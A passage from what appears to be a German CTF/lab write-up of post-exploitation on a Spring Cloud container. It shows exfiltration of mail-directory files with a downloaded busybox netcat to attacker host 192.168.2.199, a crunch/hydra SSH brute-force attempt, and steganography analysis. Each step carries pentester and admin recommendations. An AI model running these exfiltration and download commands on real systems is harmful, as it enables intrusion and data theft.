+JAVA_TOOL_OPTIONS=-Djava.security.properties=/layers/paketo-buildpacks_bellsoft-liberica/java-security-properties/java-security.properties -XX:+ExitOnOutOfMemoryError -XX:ActiveProcessorCount=1 -XX:MaxDirectMemorySize=10M -Xmx1722648K -XX:MaxMetaspaceSize=201135K -XX:ReservedCodeCacheSize=240M -Xss1M -XX:+UnlockDiagnosticVMOptions -XX:NativeMemoryTracking=summary -XX:+PrintNMTStatistics -Dorg.springframework.cloud.bindings.boot.enable=true
+CLASSPATH=/workspace
+BPL_JVM_THREAD_COUNT=250
+USER=fuck
+PWD=/root
+HOME=/root
+JAVA_SECURITY_PROPERTIES=/layers/paketo-buildpacks_bellsoft-liberica/java-security-properties/java-security.properties
+BPI_JVM_CACERTS=/layers/paketo-buildpacks_bellsoft-liberica/jre/lib/security/cacerts
+BPI_JVM_SECURITY_PROVIDERS=10|JdkLDAP 11|JdkSASL 12|SunPKCS11 1|SUN 2|SunRsaSign 3|SunEC 4|SunJSSE 5|SunJCE 6|SunJGSS 7|SunSASL 8|XMLDSig 9|SunPCSC
+BPI_APPLICATION_PATH=/workspace
+MAIL=/var/mail/fuck
+TERM=xterm
+SHELL=/bin/bash
+SHLVL=9
+LANGUAGE=en_US.UTF-8
+LOGNAME=fuck
+MALLOC_ARENA_MAX=2
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+_=/usr/bin/env
+</pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Der `env`-Befehl listet die Umgebungsvariablen für die aktuelle Shell (die Root-Shell des Benutzers `fuck`) auf. Sichtbar sind zahlreiche Variablen, viele davon bezogen auf Java (`JAVA_HOME`, `JAVA_TOOL_OPTIONS`, `CLASSPATH`), Paketo Buildpacks (`BPI_...`) und Standard-Linux-Umgebungsvariablen (`PATH`, `HOME`, `SHELL`, `LANG`, `USER`).</p>
+             <p class="evaluation">**Bewertung:** Die Umgebungsvariablen geben Einblick in die Konfiguration der Laufzeitumgebung, insbesondere der Java-Anwendung. Es sind keine offensichtlichen Passwörter oder API-Keys direkt sichtbar. Die `JAVA_TOOL_OPTIONS` zeigen einige JVM-Optimierungen und Konfigurationen. Der `PATH` ist relativ standardmäßig.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Die Werte der Variablen prüfen, insbesondere `JAVA_TOOL_OPTIONS` oder andere anwendungsspezifische Variablen, falls vorhanden, auf mögliche Angriffsflächen oder Konfigurationsfehler. Die Information über Paketo Buildpacks kann nützlich sein, um die Container-Erstellungsmethode zu verstehen.<br>**Empfehlung (Admin):** Sicherstellen, dass keine sensiblen Informationen über Umgebungsvariablen an Prozesse übergeben werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">root@921567b128b2:/var/mail/mathlake#</span> <span class="command">ls -la</span>
+total 28
+drwx--S---. 2 <span class="command">root mail</span>    55 Mar 12 01:47 .
+drwxrwsr-x. 1 <span class="command">root mail</span>    22 Mar 12 01:41 ..
+-rw-r--r--. 1 <span class="command">root mail</span> <span class="command">10299</span> Mar  7 08:14 <span class="command">data.xlsx</span>
+-rw-r--r--. 1 <span class="command">root mail</span>  <span class="command">3906</span> Mar 11 23:56 <span class="command">test.png</span>
+-rw-r--r--. 1 <span class="command">root mail</span>  <span class="command">8815</span> Mar 11 23:58 <span class="command">true.png</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Jetzt, als `root`, wird der Inhalt des Verzeichnisses `/var/mail/mathlake` erfolgreich aufgelistet. Es enthält drei Dateien: `data.xlsx`, `test.png` und `true.png`. Alle gehören `root:mail` und sind für `root` lesbar.</p>
+             <p class="evaluation">**Bewertung:** Der Zugriff auf dieses Verzeichnis bestätigt die Root-Rechte. Die Datei `data.xlsx` ist höchstwahrscheinlich die "Daten"-Datei, die in der E-Mail/Note erwähnt wurde. Die beiden PNG-Dateien sind unerwartet und könnten ebenfalls Hinweise enthalten (z.B. durch Steganografie).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Alle drei Dateien auf das Angreifer-System übertragen (exfiltrieren), um sie genauer zu analysieren. Die `data.xlsx` auf relevante Informationen prüfen. Die PNG-Dateien mit Steganografie-Tools (wie `zsteg`, `steghide`) untersuchen.<br>**Empfehlung (Admin):** Überprüfen, warum diese Dateien im Mail-Verzeichnis von `mathlake` liegen und `root` gehören. Sicherstellen, dass nur relevante Mail-Daten dort gespeichert werden und die Berechtigungen korrekt sind.</p>
+
+            <p class="analysis">**Analyse:** Dieser Abschnitt beschreibt den Versuch, mittels `crunch` eine spezifische Passwortliste zu generieren und diese dann mit `hydra` gegen den SSH-Login von `mathlake` zu testen. `crunch 12 12 -t mathlake256^ -o crunch_list.txt` würde versuchen, 12-stellige Passwörter zu erzeugen, die mit "mathlake256" beginnen und mit einem Sonderzeichen (`^`) enden, wobei die restlichen Zeichen variieren (diese Syntax ist wahrscheinlich nicht ganz korrekt für `crunch`, aber die Idee ist klar). Der `hydra`-Befehl versucht dann, sich mit dem Benutzer `mathlake` und den Passwörtern aus der generierten Liste per SSH anzumelden. Die Ausgabe zeigt, dass `hydra` keine gültigen Passwörter in dieser Liste gefunden hat.</p>
+            <p class="evaluation">**Bewertung:** Dies war ein alternativer Brute-Force-Versuch, basierend auf der Annahme, das Passwort könnte eine Variation des Benutzernamens und der Zahl 256 sein. Dieser Versuch war nicht erfolgreich, was darauf hindeutet, dass das Passwort komplexer ist oder einem anderen Muster folgt (wie sich später herausstellte: es war der SHA-256 Hash von `56*1*1`).</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Wenn gezielte Wortlisten (wie hier mit `crunch`) fehlschlagen, auf allgemeinere Wortlisten (wie `rockyou.txt`) oder auf die Analyse der eigentlichen Passwort-Generierungslogik (wie später erfolgreich geschehen) zurückgreifen.<br>**Empfehlung (Admin):** Starke Passwörter erzwingen. Brute-Force-Schutzmechanismen implementieren (z.B. `fail2ban`). SSH-Login möglichst auf Schlüsselbasis (Key-based Authentication) umstellen.</p>
+
+            <p class="analysis">**Analyse:** Es werden verschiedene Versuche unternommen, Dateien aus `/var/mail/mathlake` vom Zielsystem (`root@921567b128b2`) auf das Angreifer-System (`192.168.2.199`) zu übertragen (Exfiltration).
+                *   `wget --post-file=... http://...`: Versuch, die Datei als POST-Daten zu senden.
+                *   `nc -lp 9001 > data.xlsx`: Auf dem Angreifer wird ein Listener gestartet, um die Datei zu empfangen.
+                *   `curl -X POST --data-binary @... http://...`: Versuch, die Datei als binäre POST-Daten zu senden.
+                Alle diese Versuche werden als "fehlgeschlagen" beschrieben.</p>
+            <p class="evaluation">**Bewertung:** Zeigt verschiedene Standardmethoden zur Datenexfiltration. Das Fehlschlagen deutet auf mögliche Netzwerkfilter, Firewall-Regeln oder fehlende Tools/Berechtigungen für diese Methoden auf dem Zielsystem hin.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Andere Exfiltrationsmethoden testen: SCP/SFTP (falls SSH-Server auf Angreifer läuft und Ziel `scp`/`sftp` hat), Python HTTP-Server auf Ziel und `wget`/`curl` auf Angreifer, DNS-Exfiltration (bei starker Firewall), ICMP-Exfiltration.<br>**Empfehlung (Admin):** Ausgehende Verbindungen vom Server auf notwendige Ports/Ziele beschränken. Data Loss Prevention (DLP)-Systeme können versuchen, den Abfluss sensibler Daten zu erkennen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">/tmp/nc 192.168.2.199 8000 &lt; /var/mail/mathlake/data.xlsx</span>
+<span class="password">/tmp/nc: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /tmp/nc)</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Es wird versucht, eine (vermutlich vom Angreifer hochgeladene) Version von `nc` aus `/tmp` zu verwenden, um die `data.xlsx` an Port 8000 des Angreifers zu senden. Der Befehl schlägt jedoch fehl, weil diese `nc`-Version eine neuere Version der C-Standardbibliothek (GLIBC 2.34) benötigt, als auf dem Zielsystem installiert ist.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein häufiges Problem bei der Verwendung von statisch oder dynamisch gelinkten Binaries auf unterschiedlichen Systemen. Die Bibliotheksinkompatibilität verhindert die Ausführung. Zeigt, dass das einfache Hochladen von Tools nicht immer funktioniert.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen, eine statisch gelinkte Version von `nc` oder anderen Tools zu finden, die keine externen Bibliotheken benötigen. Alternativ Tools verwenden, die bereits auf dem System vorhanden sind (wie `bash` für /dev/tcp oder `wget`, wenn es funktioniert).<br>**Empfehlung (Admin):** Ausführung von Dateien aus `/tmp` sollte idealerweise verhindert werden (Mount-Option `noexec`). Systembibliotheken aktuell halten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">python3 -m http.server 8000</span></div>
+                    <pre>
+Serving HTTP on <span class="command">0.0.0.0</span> port <span class="command">8000</span> (http://0.0.0.0:8000/) ...
+<span class="password">192.168.2.183 - - [23/Apr/2025 10:30:03] "GET /beans.xml HTTP/1.1" 200 -</span>
+<span class="password">192.168.2.183 - - [23/Apr/2025 10:30:03] "GET /beans.xml HTTP/1.1" 200 -</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Erneute Anzeige der HTTP-Server-Logs des Angreifers. Sie zeigen die erfolgreichen GET-Anfragen für `beans.xml` vom Zielserver (`192.168.2.183`), die zum erfolgreichen Initial Access führten.</p>
+            <p class="evaluation">**Bewertung:** Dient als Referenz oder Bestätigung des erfolgreichen Exploit-Schritts.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Diese Logs aufbewahren als Teil des Nachweises für den Angriffsweg.<br>**Empfehlung (Admin):** Wichtigkeit des Monitorings ausgehender Verbindungen.</p>
+
+            <p class="analysis">**Analyse:** Es wird eine URL zu einem GitHub-Repository gezeigt, das statisch kompilierte Versionen von `busybox` enthält. `busybox` ist ein einzelnes Binary, das viele gängige Unix-Tools (wie `nc`, `wget`, `ls`, `cat` etc.) beinhaltet. Statisch kompiliert bedeutet, dass es keine externen Bibliotheken wie GLIBC benötigt.</p>
+            <p class="evaluation">**Bewertung:** Die Verwendung einer statischen `busybox`-Version ist eine gute Strategie, um das Problem der GLIBC-Inkompatibilität (wie beim vorherigen `nc`-Versuch) zu umgehen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Eine passende statische `busybox`-Version (hier für `x86_64-linux-gnu`) herunterladen und auf das Zielsystem hochladen (z.B. über den HTTP-Server des Angreifers und `wget` auf dem Ziel, falls das noch geht, oder über die bestehende Shell).<br>**Empfehlung (Admin):** Hochladen und Ausführen unbekannter Binaries auf dem System sollte überwacht und idealerweise verhindert werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">wget http://192.168.2.199:8000/busybox -O busybox</span>
+--2025-04-24 20:28:13--  http://192.168.2.199:8000/busybox
+Connecting to 192.168.2.199:8000... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 2599072 (2.5M) [application/octet-stream]
+Saving to: ‘busybox’
+
+busybox             100%[===================&gt;]   2.48M  --.-KB/s    in 0.006s
+
+<span class="password">2025-04-24 20:28:13 (385 MB/s) - ‘busybox’ saved [2599072/2599072]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Als `root` wird `wget` auf dem Zielsystem verwendet, um die `busybox`-Datei vom HTTP-Server des Angreifers (Port 8000) herunterzuladen und unter dem Namen `busybox` im aktuellen Verzeichnis (`/tmp`) zu speichern. Der Download ist erfolgreich.</p>
+            <p class="evaluation">**Bewertung:** Zeigt, dass ausgehende HTTP-Verbindungen vom Ziel zum Angreifer möglich sind und `wget` funktioniert. Das statische `busybox`-Binary ist nun auf dem Ziel verfügbar.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das heruntergeladene `busybox`-Binary ausführbar machen (`chmod +x /tmp/busybox`) und dann dessen integrierte Tools (wie `nc`) für die Datenexfiltration oder andere Aufgaben verwenden.<br>**Empfehlung (Admin):** Ausgehende Verbindungen einschränken. Überwachen, welche Dateien auf das System heruntergeladen werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">./busybox nc</span>
+BusyBox v1.36.0 (2023-04-24 07:00:08 UTC) multi-call binary.
+
+Usage: nc [OPTIONS] HOST PORT  - connect
+nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
+
+	-e PROG	Run PROG after connect (must be last)
+	-l	Listen mode, for inbound connects
+	-lk	With -e, provides persistent server
+	-p PORT	Local port
+	-s ADDR	Local address
+	-w SEC	Timeout for connects and final net reads
+	-i SEC	Delay interval for lines sent
+	-n	Don&apos;t do DNS resolution
+	-u	UDP mode
+	-b	Allow broadcasts
+	-v	Verbose
+	-o FILE	Hex dump traffic
+	-z	Zero-I/O mode (scanning)
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Das heruntergeladene `busybox`-Binary wird mit dem Argument `nc` aufgerufen (`./busybox nc`). `busybox` erkennt das Argument und zeigt die Hilfe/Usage-Informationen für das integrierte `nc`-Applet (Netcat) an.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt, dass das `busybox`-Binary auf dem Zielsystem lauffähig ist und das `nc`-Tool enthält. Dies löst das vorherige Problem mit der inkompatiblen `nc`-Version.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nun das `busybox nc` für die Datenexfiltration verwenden.<br>**Empfehlung (Admin):** Siehe vorherige Empfehlung zum Verhindern des Hochladens/Ausführens unbekannter Binaries.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">nc -l -p 5555 > data.xlsx</span></div>
+                     <pre></pre> <!-- Keine Ausgabe vom Listener, wartet auf Verbindung -->
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Auf dem Angreifer-System wird ein Netcat-Listener auf Port 5555 gestartet. Alle Daten, die an diesen Port gesendet werden, werden in die Datei `data.xlsx` umgeleitet.</p>
+            <p class="evaluation">**Bewertung:** Vorbereitung zum Empfang der `data.xlsx`-Datei vom Zielsystem.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Sicherstellen, dass Port 5555 auf dem Angreifer-System frei ist und die Firewall eingehende Verbindungen erlaubt.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command"> ./busybox nc 192.168.2.199 5555 < /var/mail/mathlake/data.xlsx</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Auf dem Zielsystem wird nun das `busybox`-Netcat (`./busybox nc`) verwendet, um eine Verbindung zum Angreifer-System (`192.168.2.199`) auf Port `5555` herzustellen. Der Inhalt der Datei `/var/mail/mathlake/data.xlsx` wird als Standardeingabe (`<`) an den `nc`-Befehl übergeben und somit über die Netzwerkverbindung an den Listener des Angreifers gesendet.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Exfiltration der `data.xlsx`-Datei unter Verwendung des statischen `busybox`-Binaries. Die Datei sollte nun auf dem Angreifer-System in `data.xlsx` gespeichert sein.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfen, ob die Datei auf dem Angreifer-System korrekt und vollständig angekommen ist. Den Inhalt der Excel-Datei analysieren. Denselben Prozess für die beiden PNG-Dateien wiederholen.<br>**Empfehlung (Admin):** Netzwerk-Firewall-Regeln zur Einschränkung ausgehender Verbindungen überprüfen und verschärfen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">ls -la /var/mail/mathlake</span>
+total 28
+drwx--S---. 2 <span class="command">root mail</span>    55 Mar 12 01:47 .
+drwxrwsr-x. 1 <span class="command">root mail</span>    22 Mar 12 01:41 ..
+-rw-r--r--. 1 <span class="command">root mail</span> <span class="command">10299</span> Mar  7 08:14 <span class="command">data.xlsx</span>
+-rw-r--r--. 1 <span class="command">root mail</span>  <span class="command">3906</span> Mar 11 23:56 <span class="command">test.png</span>
+-rw-r--r--. 1 <span class="command">root mail</span>  <span class="command">8815</span> Mar 11 23:58 <span class="command">true.png</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Erneute Auflistung des Inhalts von `/var/mail/mathlake`, wahrscheinlich zur Bestätigung, dass die Dateien noch vorhanden sind, bevor die nächsten Exfiltrationsschritte für die PNG-Dateien durchgeführt werden.</p>
+             <p class="evaluation">**Bewertung:** Einfache Bestätigung des Verzeichnisinhalts.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Mit der Exfiltration der PNG-Dateien fortfahren.<br>**Empfehlung (Admin):** Keine neue Information.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">nc -l -p 5555 > true.png</span></div>
+                     <pre></pre> <!-- Listener wartet -->
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command"> root@921567b128b2:/tmp#</span> <span class="command">./busybox nc 192.168.2.199 5555 < /var/mail/mathlake/true.png</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Der Prozess wird wiederholt: Auf dem Angreifer-System wird ein Listener gestartet, der die eingehenden Daten in `true.png` speichert. Auf dem Zielsystem wird `busybox nc` verwendet, um `/var/mail/mathlake/true.png` an den Listener zu senden.</p>
+            <p class="evaluation">**Bewertung:** Exfiltration der `true.png`-Datei.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfen, ob die Übertragung erfolgreich war. Anschließend dasselbe für `test.png` durchführen.<br>**Empfehlung (Admin):** Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">nc -l -p 5555 > test.png</span></div>
+                     <pre></pre> <!-- Listener wartet -->
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">root@921567b128b2:/tmp#</span> <span class="command">./busybox nc 192.168.2.199 5555 < /var/mail/mathlake/test.png</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der Prozess wird für die letzte Datei wiederholt: Listener auf Angreifer speichert in `test.png`. `busybox nc` auf Ziel sendet `/var/mail/mathlake/test.png`.</p>
+            <p class="evaluation">**Bewertung:** Exfiltration der `test.png`-Datei.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Überprüfen, ob alle drei Dateien (`data.xlsx`, `true.png`, `test.png`) erfolgreich übertragen wurden.<br>**Empfehlung (Admin):** Netzwerküberwachung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">ll *.png *.xlsx</span></div>
+                     <pre>
+<span class="command">-rw-r--r-- 1 root root 10299 24. Apr 22:35 data.xlsx</span>
+<span class="command">-rw-r--r-- 1 root root  3906 24. Apr 22:38 test.png</span>
+<span class="command">-rw-r--r-- 1 root root  8815 24. Apr 22:37 true.png</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Auf dem Angreifer-System wird `ll` (Alias für `ls -l` oder `ls -al`) verwendet, um die erfolgreich übertragenen Dateien aufzulisten. Größe und Zeitstempel werden angezeigt.</p>
+            <p class="evaluation">**Bewertung:** Bestätigt den erfolgreichen Empfang der drei Dateien vom Zielsystem.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Nun mit der Analyse dieser Dateien beginnen.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">mkdir test</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">mv data.xlsx test/</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc]<br>└─# <span class="command">cd test</span></div>
+                    <pre></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/test]<br>└─# <span class="command">ll</span></div>
+                     <pre>
+insgesamt 12
+-rw-r--r-- 1 root root 10299 24. Apr 22:35 data.xlsx
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/test]<br>└─# <span class="command">cp data.xlsx data.xlsx.zip</span></div>
+                     <pre></pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/test]<br>└─# <span class="command">unzip data.xlsx.zip -d xlsx_content</span></div>
+                    <pre>
+Archive:  data.xlsx.zip
+  inflating: xlsx_content/[Content_Types].xml
+  inflating: xlsx_content/_rels/.rels
+  inflating: xlsx_content/xl/workbook.xml
+....
+...
+</pre> <!-- Gekürzte Ausgabe -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Diese Befehlssequenz auf dem Angreifer-System dient der Analyse der `data.xlsx`-Datei.
+                1. Ein neues Verzeichnis `test` wird erstellt.
+                2. `data.xlsx` wird dorthin verschoben.
+                3. In das `test`-Verzeichnis wird gewechselt.
+                4. Die `data.xlsx`-Datei wird zu `data.xlsx.zip` kopiert. Dies funktioniert, da moderne Office-Dateiformate (wie .xlsx) tatsächlich ZIP-Archive sind, die XML-Dateien und andere Ressourcen enthalten.
+                5. Die umbenannte ZIP-Datei wird mit `unzip` in ein neues Verzeichnis `xlsx_content` entpackt. Die Ausgabe zeigt das Entpacken verschiedener XML-Dateien (`[Content_Types].xml`, `.rels`, `workbook.xml` etc.), die die Struktur und den Inhalt der Excel-Datei definieren.</p>
+            <p class="evaluation">**Bewertung:** Dies ist eine Standardmethode, um den internen Aufbau einer Office-Datei zu untersuchen. Es kann manchmal versteckte Informationen, Metadaten oder Kommentare in den XML-Dateien aufdecken, die in der normalen Ansicht nicht sichtbar sind.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die entpackten XML-Dateien im Verzeichnis `xlsx_content` (insbesondere `sharedStrings.xml`, `sheetX.xml`, `workbook.xml`) auf interessante Inhalte, Kommentare oder Metadaten untersuchen.<br>**Empfehlung (Admin):** Metadaten und Kommentare aus Office-Dateien entfernen, bevor sie geteilt oder veröffentlicht werden, falls sie sensible Informationen enthalten könnten.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~/…/CVE-2024-37084-Poc/test/xlsx_content/xl]<br>└─# <span class="command">zsteg ~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/test.png</span></div>
+                      <pre>
+b1,r,lsb,xy         .. file: Atari DEGAS Elite bitmap 640 x 400 x 2, color palette 0400 0000 0080 0010 0400 ...
+b2,r,msb,xy         .. text: "TUUUUUUUUUUUUUUUUUUUUU"
+b2,g,lsb,xy         .. text: "UUUUUUUUUUUUUUUUUUUUUSUUUUUU_W"
+<span class="command">b2,b,lsb,xy         .. file: MPEG ADTS, layer III, v2, Monaural</span>
+b4,r,lsb,xy         .. file: SoftQuad DESC or font file binary - version 1194
+b4,r,msb,xy         .. file: VISX image file
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Das Steganografie-Tool `zsteg` wird verwendet, um die Datei `test.png` auf versteckte Daten zu untersuchen. `zsteg` prüft verschiedene Methoden (Bit-Ebenen, Farbkanäle, Reihenfolgen). Die Ausgabe zeigt mehrere potenzielle Funde. Besonders interessant ist `b2,b,lsb,xy .. file: MPEG ADTS, layer III, v2, Monaural`, was darauf hindeutet, dass in den niedrigstwertigen Bits (LSB) des Blaukanals (b) möglicherweise eine MP3-Audiodatei (MPEG layer III) versteckt ist.</p>
+            <p class="evaluation">**Bewertung:** Steganografie ist eine häufige Technik in CTFs, um Hinweise oder Daten in scheinbar harmlosen Dateien (wie Bildern) zu verstecken. Der Fund einer potenziellen MP3-Datei ist vielversprechend.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen, die identifizierte MP3-Datei aus `test.png` zu extrahieren, z.B. mit `zsteg -E 'b2,b,lsb,xy' test.png > test_hidden.mp3`. Die extrahierte Audiodatei anhören oder weiter analysieren.<br>**Empfehlung (Admin):** Systeme zum Erkennen von Steganografie sind komplex und nicht weit verbreitet. Wichtiger ist es, den unautorisierten Transfer von Dateien (egal ob mit oder ohne versteckten Daten) zu verhindern.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~/…/CVE-2024-37084-Poc/test/xlsx_content/xl]<br>└─# <span class="command">zsteg ~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/true.png</span></div>
+                      <pre>
+<span class="command">b3,rgba,lsb,xy      .. file: MPEG ADTS, AAC, v4 Main, 88.2 kHz, surround + side</span>
+<span class="command">b4,rgb,lsb,xy       .. file: MPEG ADTS, AAC, v4 Main, 96 kHz, stereo + center</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** `zsteg` wird nun auf die Datei `true.png` angewendet. Auch hier werden potenzielle versteckte Dateien gefunden, diesmal im AAC-Audioformat (MPEG ADTS, AAC). Zwei mögliche Streams werden identifiziert.</p>
+             <p class="evaluation">**Bewertung:** Auch diese Datei enthält wahrscheinlich versteckte Audio-Daten. AAC ist ein anderes gängiges Audioformat.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Versuchen, auch diese Streams zu extrahieren (z.B. `zsteg -E 'b3,rgba,lsb,xy' true.png > true_hidden_1.aac` und `zsteg -E 'b4,rgb,lsb,xy' true.png > true_hidden_2.aac`) und anzuhören/analysieren.<br>**Empfehlung (Admin):** Siehe oben.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~/…/CVE-2024-37084-Poc/test/xlsx_content/xl]<br>└─# <span class="command"># Beispiel: Extrahiere den MPEG-Stream aus test.png</span><br><span class="command">zsteg -E 'b2,b,lsb,xy' ~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/test.png > /home/ccat/Downloads/testpng_data.mp3</span></div>
+                      <pre></pre> <!-- Keine Ausgabe von zsteg bei erfolgreicher Extraktion -->
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Der `zsteg`-Befehl wird nun mit der Option `-E` ausgeführt, um die zuvor identifizierten versteckten Daten aus `test.png` (Bit 2, Blaukanal, LSB, XY-Reihenfolge) zu extrahieren und in die Datei `/home/ccat/Downloads/testpng_data.mp3` zu schreiben.</p>
+            <p class="evaluation">**Bewertung:** Erfolgreiche Extraktion der versteckten Daten. Die resultierende MP3-Datei kann nun analysiert werden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die MP3-Datei mit einem Audio-Player öffnen und anhören. Auf gesprochene Worte, Töne oder andere Hinweise achten. Ggf. auch eine Spektralanalyse durchführen.<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿CCat)-[~/…/CVE-2024-37084-Poc/test/xlsx_content/xl]<br>└─# <span class="command"># Beispiel: Extrahiere den MPEG-Stream aus test.png</span><br><span class="command">zsteg -E 'b2,b,lsb,xy' ~/Hackingtools/spring_Cloud/CVE-2024-37084-Poc/true.png > /home/ccat/Downloads/truepng_data.mp3</span></div>
+                     <pre></pre> <!-- Keine Ausgabe -->
+                 </div>
+             </div>
+            <p class="analysis">**Analyse:** Hier wird versucht, die Daten aus `true.png` mit der *gleichen* `zsteg`-Extraktionsmethode (`b2,b,lsb,xy`) wie bei `test.png` zu extrahieren und als MP3 zu speichern. Dies ist wahrscheinlich ein Fehler im Berichtstext, da `zsteg` für `true.png` andere Bit-Ebenen/Formate (`b3,rgba...` und `b4,rgb...` für AAC) angezeigt hat.</p>
+            <p class="evaluation">**Bewertung:** Dieser Extraktionsversuch wird wahrscheinlich keine sinnvollen Daten liefern oder fehlschlagen, da die falsche Extraktionsmethode für `true.png` verwendet wird.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die korrekten Extraktionsparameter für `true.png` verwenden, die `zsteg` zuvor angezeigt hat (z.B. `-E 'b3,rgba,lsb,xy'` und als `.aac` speichern).<br>**Empfehlung (Admin):** Keine direkte Relevanz.</p>
+
